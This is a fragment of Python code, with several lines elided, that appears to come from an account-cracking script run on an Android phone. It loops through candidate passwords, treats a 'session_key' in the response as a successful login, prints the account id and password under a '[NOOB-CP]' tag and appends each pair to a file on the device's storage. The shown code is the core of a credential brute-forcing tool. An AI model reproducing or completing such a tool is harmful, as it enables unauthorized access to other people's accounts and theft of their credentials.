    ...
    try:
        for pw in pwv:
            ...
            if 'session_key' in po:
                ...
                print(f'\r\x1b[1;32m[NOOB-CP] {str(idf)} | {str(pw)} ')
                open('/sdcard/NOOB/RANDOM-CP.txt', 'a').write(str(idf)+'|'+str(pw)+'\n')
                cps.append(str(idf))
                break
            else:
